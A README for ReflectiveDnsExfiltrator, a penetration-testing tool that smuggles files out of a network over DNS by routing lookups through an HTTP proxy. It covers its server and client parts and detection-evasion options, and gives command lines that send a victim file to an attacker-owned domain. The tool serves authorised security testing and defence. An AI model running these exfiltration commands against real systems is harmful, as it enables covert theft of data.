ReflectiveDnsExfiltrator
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

ReflectiveDnsExfiltrator allows for transfering (*exfiltrate*) a file over a DNS resolution covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.

This tool is a sibling of my [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator), but it addresses the specific case of **the source computer**, from which you need/want to exfiltrate data, **not allowed to perform DNS resolution of external domain names** (*which is required in order to use the DNS resolution covert channel*).
  
The solution proposed here is to use a third party device exposing a service which will have to resolve a domain name on behalf of the source computer. The perfect, and most basic example, is to use a **HTTP proxy server** and feed it with some HEAD requests for all the external domain names used for exfiltrating data. It does not matter whether or not the HEAD request gets a proper HTTP response, we really don't care, as long as the proxy first has to resolve the domain name, hence allowing for data exfiltration.

ReflectiveDnsExfiltrator has two sides:
  1. The **server side**, coming as a single python script (`reflectiveDnsExfiltrator.py`), which acts as a custom DNS server, receiving the file
  2. The **client side** (*victim's side*), which comes in three flavors:
  - `reflectiveDnsExfiltrator.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
  - `Invoke-ReflectiveDNSExfiltrator.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the dnsExfiltrator assembly
  - `reflectiveDnsExfiltrator.js`: a JScript script which is a conversion of the reflectiveDnsExfiltrator DLL assembly using DotNetToJScript, and providing the exact same functionnalities

In order for the whole thing to work **you must own a domain name** and set the DNS record (NS) for that domain to point to the server that will run the `reflectiveDnsExfiltrator.py` server side.

Features
----------------------

DNSExfiltrator supports **basic RC4 encryption** of the exfiltrated data, using the provided password to encrypt/decrypt the data.

ReflectiveDnsExfiltrator also provides some optional features to avoid detection:
  - requests throttling in order to stay more stealthy when exfiltrating data
  - reduction of the DNS request size (*by default it will try to use as much bytes left available in each DNS request for efficiency*)
  - reduction of the DNS label size (*by default it will try to use the longest supported label size of 63 chars*)

<img src="https://dl.dropboxusercontent.com/s/4pkcxodw7i6acgs/reflectiveDnsExfiltrator_04.jpg?dl=0" width="600">

Dependencies
----------------------

The only dependency is on the server side, as the `reflectiveDnsExfiltrator.py` script relies on the external **dnslib** library. You can install it using pip:
```
pip install -r requirements.txt
```

Usage
----------------------

***SERVER SIDE***

Start the `reflectiveDnsExfiltrator.py` script passing it the domain name and decryption password to be used:
```
root@kali:~# ./reflectiveDnsExfiltrator.py -d mydomain.com -p password
```

***CLIENT SIDE***

You can **either** use the compiled version, **or** the PowerShell wrapper (*which is basically the same thing*) **or** the JScript wrapper. In any case, the parameters are the same, with just a slight difference in the way of passing them in PowerShell.

1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
```
reflectiveDnsExfiltrator.exe <file> <domainName> <password> <webProxy> [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]
      file:           [MANDATORY] The file name to the file to be exfiltrated.
      domainName:     [MANDATORY] The domain name to use for DNS requests.
      password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
      webProxy:       [MANDATORY] The proxy server to use as a reflective DNS resolution host, in the form <proxyAddess:proxyPort>.
      throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
      requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
      labelMaxSize:   [OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.
```
<img src="https://dl.dropboxusercontent.com/s/a0ojh49t72mgcgi/reflectiveDnsExfiltrator_01.jpg?dl=0" width="900">


2/ Using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
```
c:\ReflectiveDNSExfiltrator> powershell
PS c:\ReflectiveDNSExfiltrator> Import-Module .\Invoke-ReflectiveDNSExfiltrator.ps1
PS c:\ReflectiveDNSExfiltrator> Invoke-ReflectiveDNSExfiltrator -i inputFile -d mydomain.com -p password -s proxyServer:proxyPort -t 500
[...]
```
Check the EXAMPLES section in the script file for further usage examples.
<img src="https://dl.dropboxusercontent.com/s/5tqvt6s89jmyowo/reflectiveDnsExfiltrator_02.jpg?dl=0" width="900">

3/ Using the JScript script, pass it the exact same arguments as you would with the standalone Windows executable:
```
cscript.exe reflectiveDnsExfiltrator.js inputFile mydomain.com password proxyServer:proxyPort
```
Or, with some options:
```
cscript.exe reflectiveDnsExfiltrator.js inputFile mydomain.com password proxyServer:proxyPort t=500
```
<img src="https://dl.dropboxusercontent.com/s/2dhxyp89rhu16g0/reflectiveDnsExfiltrator_03.jpg?dl=0" width="900">

TODO
----------------
  - Some will ask for AES encryption instead of RC4, I know... might add it later
  - Display estimated transfer time
  - Do better argument parsing (*I'm too lazy to learn how to use a c# argument parsing library, I wish it was as simple as Python*)

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*